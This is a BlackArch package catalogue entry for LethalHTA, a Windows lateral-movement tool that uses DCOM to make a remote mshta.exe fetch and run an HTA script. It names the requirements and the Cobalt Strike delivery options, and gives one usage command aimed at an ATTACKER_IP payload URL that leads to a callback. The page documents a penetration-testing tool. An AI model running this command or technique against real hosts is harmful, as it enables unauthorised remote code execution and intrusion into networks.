---
name: "lethalhta"
categories:
  - blackarch-windows
version: "2.5602402"
homepage: "https://github.com/codewhitesec/LethalHTA"
packaged-by: [blackarch]
blackarch-builddate: "2022-10-30"
build-system: windows
license: MIT
meta-checked: "2026-11-09"
github-repo: "codewhitesec/LethalHTA"
github-stars: 232
github-pushed: "2022-10-18"
github-archived: false
github-issues: 1
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.6
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# lethalhta

> Lateral movement to a remote mshta.exe through DCOM and an HTA URL — code execution without a service or scheduled task.

## What it's for

LethalHTA (Code White's 2018 technique) remotely instantiates the well-known `htafile` COM object (CLSID 3050F4D8-98B5-11CF-BB82-00AA00BDCE0B) on a target via DCOM and calls `IPersistMoniker::Load()` with a URL moniker: mshta.exe on the target then fetches the HTA from your URL and evaluates its script (JScript/VBScript, or DotNetToJScript payloads run from memory). The fetched file does not need a .hta extension — .html, .txt, .rtf or no extension all work. The repo ships a .NET console implementation (LethalHTADotNet, installed here as the `lethalhta` command running under mono), a native version, and a Cobalt Strike aggressor script (`LethalHTA.cna`) adding "HTA PowerShell Delivery" and "HTA .NET In-Memory Delivery" lateral-movement options. Requirements: DCOM reachability (TCP 135 plus dynamic RPC ports), an account with launch/activation rights on the target, and an HTA the target can fetch over HTTP. It is a lateral-movement tool, not a privilege escalation.

## Typical use cases

### Trigger remote HTA execution on a target

```
lethalhta target.example.com http://ATTACKER_IP/payload.hta
```

Outcome: creates the htafile COM object on target.example.com and makes mshta.exe there download and run payload.hta within its own process — watch the fetch land on your HTTP server, then the callback on your handler. The payload runs in the context of the remotely activated COM server; no file needs a .hta extension on disk.

*No corpus evidence — derived from upstream documentation and source (`DotNet/LethalHTADotNet/LethalHTA.cs`, usage `LethalHTADotNet.exe target url/to/hta`).*
